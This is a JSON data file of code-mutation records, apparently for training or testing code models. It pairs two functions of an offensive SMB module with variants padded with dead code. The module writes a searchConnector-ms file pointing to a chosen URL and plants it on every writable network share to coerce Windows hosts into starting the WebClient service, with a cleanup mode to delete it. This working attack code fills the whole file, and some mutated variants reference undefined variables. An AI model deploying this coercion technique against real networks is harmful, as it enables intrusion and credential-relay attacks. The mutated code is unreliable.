[
    {
        "func_name": "options",
        "original": "def options(self, context, module_options):\n    \"\"\"\n        Technique discovered by @DTMSecurity and @domchell to remotely coerce an host to start WebClient service.\n        https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/\n        Module by @zblurx\n        URL         URL in the searchConnector-ms file, default https://rickroll\n        CLEANUP     Cleanup (choices: True or False)\n        SHARE       Specify a share to target\n        FILENAME    Specify the filename used WITHOUT the extension searchConnector-ms (it's automatically added), default is \"Documents\"\n        \"\"\"\n    self.cleanup = False\n    if 'CLEANUP' in module_options:\n        self.cleanup = bool(module_options['CLEANUP'])\n    self.url = 'https://rickroll'\n    if 'URL' in module_options:\n        self.url = str(module_options['URL'])\n    self.sharename = ''\n    if 'SHARE' in module_options:\n        self.sharename = str(module_options['SHARE'])\n    self.filename = 'Documents'\n    if 'FILENAME' in module_options:\n        self.filename = str(module_options['FILENAME'])\n    self.file_path = ntpath.join('\\\\', f'{self.filename}.searchConnector-ms')\n    if not self.cleanup:\n        self.scfile_path = f'/tmp/{self.filename}.searchConnector-ms'\n        scfile = open(self.scfile_path, 'w')\n        scfile.truncate(0)\n        scfile.write('<?xml version=\"1.0\" encoding=\"UTF-8\"?>')\n        scfile.write('<searchConnectorDescription xmlns=\"http://schemas.microsoft.com/windows/2009/searchConnector\">')\n        scfile.write('<description>Microsoft Outlook</description>')\n        scfile.write('<isSearchOnlyItem>false</isSearchOnlyItem>')\n        scfile.write('<includeInStartMenuScope>true</includeInStartMenuScope>')\n        scfile.write(f'<iconReference>{self.url}/0001.ico</iconReference>')\n        scfile.write('<templateInfo>')\n        scfile.write('<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>')\n        scfile.write('</templateInfo>')\n        scfile.write('<simpleLocation>')\n        scfile.write('<url>{}</url>'.format(self.url))\n        scfile.write('</simpleLocation>')\n        scfile.write('</searchConnectorDescription>')\n        scfile.close()",
        "mutated": [
            "def options(self, context, module_options):\n    if False:\n        i = 10\n    '\\n        Technique discovered by @DTMSecurity and @domchell to remotely coerce an host to start WebClient service.\\n        https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/\\n        Module by @zblurx\\n        URL         URL in the searchConnector-ms file, default https://rickroll\\n        CLEANUP     Cleanup (choices: True or False)\\n        SHARE       Specify a share to target\\n        FILENAME    Specify the filename used WITHOUT the extension searchConnector-ms (it\\'s automatically added), default is \"Documents\"\\n        '\n    self.cleanup = False\n    if 'CLEANUP' in module_options:\n        self.cleanup = bool(module_options['CLEANUP'])\n    self.url = 'https://rickroll'\n    if 'URL' in module_options:\n        self.url = str(module_options['URL'])\n    self.sharename = ''\n    if 'SHARE' in module_options:\n        self.sharename = str(module_options['SHARE'])\n    self.filename = 'Documents'\n    if 'FILENAME' in module_options:\n        self.filename = str(module_options['FILENAME'])\n    self.file_path = ntpath.join('\\\\', f'{self.filename}.searchConnector-ms')\n    if not self.cleanup:\n        self.scfile_path = f'/tmp/{self.filename}.searchConnector-ms'\n        scfile = open(self.scfile_path, 'w')\n        scfile.truncate(0)\n        scfile.write('<?xml version=\"1.0\" encoding=\"UTF-8\"?>')\n        scfile.write('<searchConnectorDescription xmlns=\"http://schemas.microsoft.com/windows/2009/searchConnector\">')\n        scfile.write('<description>Microsoft Outlook</description>')\n        scfile.write('<isSearchOnlyItem>false</isSearchOnlyItem>')\n        scfile.write('<includeInStartMenuScope>true</includeInStartMenuScope>')\n        scfile.write(f'<iconReference>{self.url}/0001.ico</iconReference>')\n        scfile.write('<templateInfo>')\n        scfile.write('<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>')\n        scfile.write('</templateInfo>')\n        scfile.write('<simpleLocation>')\n        scfile.write('<url>{}</url>'.format(self.url))\n        scfile.write('</simpleLocation>')\n        scfile.write('</searchConnectorDescription>')\n        scfile.close()",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    '\\n        Technique discovered by @DTMSecurity and @domchell to remotely coerce an host to start WebClient service.\\n        https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/\\n        Module by @zblurx\\n        URL         URL in the searchConnector-ms file, default https://rickroll\\n        CLEANUP     Cleanup (choices: True or False)\\n        SHARE       Specify a share to target\\n        FILENAME    Specify the filename used WITHOUT the extension searchConnector-ms (it\\'s automatically added), default is \"Documents\"\\n        '\n    self.cleanup = False\n    if 'CLEANUP' in module_options:\n        self.cleanup = bool(module_options['CLEANUP'])\n    self.url = 'https://rickroll'\n    if 'URL' in module_options:\n        self.url = str(module_options['URL'])\n    self.sharename = ''\n    if 'SHARE' in module_options:\n        self.sharename = str(module_options['SHARE'])\n    self.filename = 'Documents'\n    if 'FILENAME' in module_options:\n        self.filename = str(module_options['FILENAME'])\n    self.file_path = ntpath.join('\\\\', f'{self.filename}.searchConnector-ms')\n    if not self.cleanup:\n        self.scfile_path = f'/tmp/{self.filename}.searchConnector-ms'\n        scfile = open(self.scfile_path, 'w')\n        scfile.truncate(0)\n        scfile.write('<?xml version=\"1.0\" encoding=\"UTF-8\"?>')\n        scfile.write('<searchConnectorDescription xmlns=\"http://schemas.microsoft.com/windows/2009/searchConnector\">')\n        scfile.write('<description>Microsoft Outlook</description>')\n        scfile.write('<isSearchOnlyItem>false</isSearchOnlyItem>')\n        scfile.write('<includeInStartMenuScope>true</includeInStartMenuScope>')\n        scfile.write(f'<iconReference>{self.url}/0001.ico</iconReference>')\n        scfile.write('<templateInfo>')\n        scfile.write('<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>')\n        scfile.write('</templateInfo>')\n        scfile.write('<simpleLocation>')\n        scfile.write('<url>{}</url>'.format(self.url))\n        scfile.write('</simpleLocation>')\n        scfile.write('</searchConnectorDescription>')\n        scfile.close()",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    '\\n        Technique discovered by @DTMSecurity and @domchell to remotely coerce an host to start WebClient service.\\n        https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/\\n        Module by @zblurx\\n        URL         URL in the searchConnector-ms file, default https://rickroll\\n        CLEANUP     Cleanup (choices: True or False)\\n        SHARE       Specify a share to target\\n        FILENAME    Specify the filename used WITHOUT the extension searchConnector-ms (it\\'s automatically added), default is \"Documents\"\\n        '\n    self.cleanup = False\n    if 'CLEANUP' in module_options:\n        self.cleanup = bool(module_options['CLEANUP'])\n    self.url = 'https://rickroll'\n    if 'URL' in module_options:\n        self.url = str(module_options['URL'])\n    self.sharename = ''\n    if 'SHARE' in module_options:\n        self.sharename = str(module_options['SHARE'])\n    self.filename = 'Documents'\n    if 'FILENAME' in module_options:\n        self.filename = str(module_options['FILENAME'])\n    self.file_path = ntpath.join('\\\\', f'{self.filename}.searchConnector-ms')\n    if not self.cleanup:\n        self.scfile_path = f'/tmp/{self.filename}.searchConnector-ms'\n        scfile = open(self.scfile_path, 'w')\n        scfile.truncate(0)\n        scfile.write('<?xml version=\"1.0\" encoding=\"UTF-8\"?>')\n        scfile.write('<searchConnectorDescription xmlns=\"http://schemas.microsoft.com/windows/2009/searchConnector\">')\n        scfile.write('<description>Microsoft Outlook</description>')\n        scfile.write('<isSearchOnlyItem>false</isSearchOnlyItem>')\n        scfile.write('<includeInStartMenuScope>true</includeInStartMenuScope>')\n        scfile.write(f'<iconReference>{self.url}/0001.ico</iconReference>')\n        scfile.write('<templateInfo>')\n        scfile.write('<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>')\n        scfile.write('</templateInfo>')\n        scfile.write('<simpleLocation>')\n        scfile.write('<url>{}</url>'.format(self.url))\n        scfile.write('</simpleLocation>')\n        scfile.write('</searchConnectorDescription>')\n        scfile.close()",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    '\\n        Technique discovered by @DTMSecurity and @domchell to remotely coerce an host to start WebClient service.\\n        https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/\\n        Module by @zblurx\\n        URL         URL in the searchConnector-ms file, default https://rickroll\\n        CLEANUP     Cleanup (choices: True or False)\\n        SHARE       Specify a share to target\\n        FILENAME    Specify the filename used WITHOUT the extension searchConnector-ms (it\\'s automatically added), default is \"Documents\"\\n        '\n    self.cleanup = False\n    if 'CLEANUP' in module_options:\n        self.cleanup = bool(module_options['CLEANUP'])\n    self.url = 'https://rickroll'\n    if 'URL' in module_options:\n        self.url = str(module_options['URL'])\n    self.sharename = ''\n    if 'SHARE' in module_options:\n        self.sharename = str(module_options['SHARE'])\n    self.filename = 'Documents'\n    if 'FILENAME' in module_options:\n        self.filename = str(module_options['FILENAME'])\n    self.file_path = ntpath.join('\\\\', f'{self.filename}.searchConnector-ms')\n    if not self.cleanup:\n        self.scfile_path = f'/tmp/{self.filename}.searchConnector-ms'\n        scfile = open(self.scfile_path, 'w')\n        scfile.truncate(0)\n        scfile.write('<?xml version=\"1.0\" encoding=\"UTF-8\"?>')\n        scfile.write('<searchConnectorDescription xmlns=\"http://schemas.microsoft.com/windows/2009/searchConnector\">')\n        scfile.write('<description>Microsoft Outlook</description>')\n        scfile.write('<isSearchOnlyItem>false</isSearchOnlyItem>')\n        scfile.write('<includeInStartMenuScope>true</includeInStartMenuScope>')\n        scfile.write(f'<iconReference>{self.url}/0001.ico</iconReference>')\n        scfile.write('<templateInfo>')\n        scfile.write('<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>')\n        scfile.write('</templateInfo>')\n        scfile.write('<simpleLocation>')\n        scfile.write('<url>{}</url>'.format(self.url))\n        scfile.write('</simpleLocation>')\n        scfile.write('</searchConnectorDescription>')\n        scfile.close()",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    '\\n        Technique discovered by @DTMSecurity and @domchell to remotely coerce an host to start WebClient service.\\n        https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/\\n        Module by @zblurx\\n        URL         URL in the searchConnector-ms file, default https://rickroll\\n        CLEANUP     Cleanup (choices: True or False)\\n        SHARE       Specify a share to target\\n        FILENAME    Specify the filename used WITHOUT the extension searchConnector-ms (it\\'s automatically added), default is \"Documents\"\\n        '\n    self.cleanup = False\n    if 'CLEANUP' in module_options:\n        self.cleanup = bool(module_options['CLEANUP'])\n    self.url = 'https://rickroll'\n    if 'URL' in module_options:\n        self.url = str(module_options['URL'])\n    self.sharename = ''\n    if 'SHARE' in module_options:\n        self.sharename = str(module_options['SHARE'])\n    self.filename = 'Documents'\n    if 'FILENAME' in module_options:\n        self.filename = str(module_options['FILENAME'])\n    self.file_path = ntpath.join('\\\\', f'{self.filename}.searchConnector-ms')\n    if not self.cleanup:\n        self.scfile_path = f'/tmp/{self.filename}.searchConnector-ms'\n        scfile = open(self.scfile_path, 'w')\n        scfile.truncate(0)\n        scfile.write('<?xml version=\"1.0\" encoding=\"UTF-8\"?>')\n        scfile.write('<searchConnectorDescription xmlns=\"http://schemas.microsoft.com/windows/2009/searchConnector\">')\n        scfile.write('<description>Microsoft Outlook</description>')\n        scfile.write('<isSearchOnlyItem>false</isSearchOnlyItem>')\n        scfile.write('<includeInStartMenuScope>true</includeInStartMenuScope>')\n        scfile.write(f'<iconReference>{self.url}/0001.ico</iconReference>')\n        scfile.write('<templateInfo>')\n        scfile.write('<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>')\n        scfile.write('</templateInfo>')\n        scfile.write('<simpleLocation>')\n        scfile.write('<url>{}</url>'.format(self.url))\n        scfile.write('</simpleLocation>')\n        scfile.write('</searchConnectorDescription>')\n        scfile.close()"
        ]
    },
    {
        "func_name": "on_login",
        "original": "def on_login(self, context, connection):\n    shares = connection.shares()\n    for share in shares:\n        context.log.debug(f'Share: {share}')\n        if 'WRITE' in share['access'] and (share['name'] == self.sharename if self.sharename != '' else share['name'] not in ['C$', 'ADMIN$']):\n            context.log.success(f\"Found writable share: {share['name']}\")\n            if not self.cleanup:\n                with open(self.scfile_path, 'rb') as scfile:\n                    try:\n                        connection.conn.putFile(share['name'], self.file_path, scfile.read)\n                        context.log.success(f\"[OPSEC] Created {self.filename}.searchConnector-ms file on the {share['name']} share\")\n                    except Exception as e:\n                        context.log.exception(e)\n                        context.log.fail(f\"Error writing {self.filename}.searchConnector-ms file on the {share['name']} share: {e}\")\n            else:\n                try:\n                    connection.conn.deleteFile(share['name'], self.file_path)\n                    context.log.success(f\"Deleted {self.filename}.searchConnector-ms file on the {share['name']} share\")\n                except Exception as e:\n                    context.log.fail(f\"[OPSEC] Error deleting {self.filename}.searchConnector-ms file on share {share['name']}: {e}\")",
        "mutated": [
            "def on_login(self, context, connection):\n    if False:\n        i = 10\n    shares = connection.shares()\n    for share in shares:\n        context.log.debug(f'Share: {share}')\n        if 'WRITE' in share['access'] and (share['name'] == self.sharename if self.sharename != '' else share['name'] not in ['C$', 'ADMIN$']):\n            context.log.success(f\"Found writable share: {share['name']}\")\n            if not self.cleanup:\n                with open(self.scfile_path, 'rb') as scfile:\n                    try:\n                        connection.conn.putFile(share['name'], self.file_path, scfile.read)\n                        context.log.success(f\"[OPSEC] Created {self.filename}.searchConnector-ms file on the {share['name']} share\")\n                    except Exception as e:\n                        context.log.exception(e)\n                        context.log.fail(f\"Error writing {self.filename}.searchConnector-ms file on the {share['name']} share: {e}\")\n            else:\n                try:\n                    connection.conn.deleteFile(share['name'], self.file_path)\n                    context.log.success(f\"Deleted {self.filename}.searchConnector-ms file on the {share['name']} share\")\n                except Exception as e:\n                    context.log.fail(f\"[OPSEC] Error deleting {self.filename}.searchConnector-ms file on share {share['name']}: {e}\")",
            "def on_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    shares = connection.shares()\n    for share in shares:\n        context.log.debug(f'Share: {share}')\n        if 'WRITE' in share['access'] and (share['name'] == self.sharename if self.sharename != '' else share['name'] not in ['C$', 'ADMIN$']):\n            context.log.success(f\"Found writable share: {share['name']}\")\n            if not self.cleanup:\n                with open(self.scfile_path, 'rb') as scfile:\n                    try:\n                        connection.conn.putFile(share['name'], self.file_path, scfile.read)\n                        context.log.success(f\"[OPSEC] Created {self.filename}.searchConnector-ms file on the {share['name']} share\")\n                    except Exception as e:\n                        context.log.exception(e)\n                        context.log.fail(f\"Error writing {self.filename}.searchConnector-ms file on the {share['name']} share: {e}\")\n            else:\n                try:\n                    connection.conn.deleteFile(share['name'], self.file_path)\n                    context.log.success(f\"Deleted {self.filename}.searchConnector-ms file on the {share['name']} share\")\n                except Exception as e:\n                    context.log.fail(f\"[OPSEC] Error deleting {self.filename}.searchConnector-ms file on share {share['name']}: {e}\")",
            "def on_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    shares = connection.shares()\n    for share in shares:\n        context.log.debug(f'Share: {share}')\n        if 'WRITE' in share['access'] and (share['name'] == self.sharename if self.sharename != '' else share['name'] not in ['C$', 'ADMIN$']):\n            context.log.success(f\"Found writable share: {share['name']}\")\n            if not self.cleanup:\n                with open(self.scfile_path, 'rb') as scfile:\n                    try:\n                        connection.conn.putFile(share['name'], self.file_path, scfile.read)\n                        context.log.success(f\"[OPSEC] Created {self.filename}.searchConnector-ms file on the {share['name']} share\")\n                    except Exception as e:\n                        context.log.exception(e)\n                        context.log.fail(f\"Error writing {self.filename}.searchConnector-ms file on the {share['name']} share: {e}\")\n            else:\n                try:\n                    connection.conn.deleteFile(share['name'], self.file_path)\n                    context.log.success(f\"Deleted {self.filename}.searchConnector-ms file on the {share['name']} share\")\n                except Exception as e:\n                    context.log.fail(f\"[OPSEC] Error deleting {self.filename}.searchConnector-ms file on share {share['name']}: {e}\")",
            "def on_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    shares = connection.shares()\n    for share in shares:\n        context.log.debug(f'Share: {share}')\n        if 'WRITE' in share['access'] and (share['name'] == self.sharename if self.sharename != '' else share['name'] not in ['C$', 'ADMIN$']):\n            context.log.success(f\"Found writable share: {share['name']}\")\n            if not self.cleanup:\n                with open(self.scfile_path, 'rb') as scfile:\n                    try:\n                        connection.conn.putFile(share['name'], self.file_path, scfile.read)\n                        context.log.success(f\"[OPSEC] Created {self.filename}.searchConnector-ms file on the {share['name']} share\")\n                    except Exception as e:\n                        context.log.exception(e)\n                        context.log.fail(f\"Error writing {self.filename}.searchConnector-ms file on the {share['name']} share: {e}\")\n            else:\n                try:\n                    connection.conn.deleteFile(share['name'], self.file_path)\n                    context.log.success(f\"Deleted {self.filename}.searchConnector-ms file on the {share['name']} share\")\n                except Exception as e:\n                    context.log.fail(f\"[OPSEC] Error deleting {self.filename}.searchConnector-ms file on share {share['name']}: {e}\")",
            "def on_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    shares = connection.shares()\n    for share in shares:\n        context.log.debug(f'Share: {share}')\n        if 'WRITE' in share['access'] and (share['name'] == self.sharename if self.sharename != '' else share['name'] not in ['C$', 'ADMIN$']):\n            context.log.success(f\"Found writable share: {share['name']}\")\n            if not self.cleanup:\n                with open(self.scfile_path, 'rb') as scfile:\n                    try:\n                        connection.conn.putFile(share['name'], self.file_path, scfile.read)\n                        context.log.success(f\"[OPSEC] Created {self.filename}.searchConnector-ms file on the {share['name']} share\")\n                    except Exception as e:\n                        context.log.exception(e)\n                        context.log.fail(f\"Error writing {self.filename}.searchConnector-ms file on the {share['name']} share: {e}\")\n            else:\n                try:\n                    connection.conn.deleteFile(share['name'], self.file_path)\n                    context.log.success(f\"Deleted {self.filename}.searchConnector-ms file on the {share['name']} share\")\n                except Exception as e:\n                    context.log.fail(f\"[OPSEC] Error deleting {self.filename}.searchConnector-ms file on share {share['name']}: {e}\")"
        ]
    }
]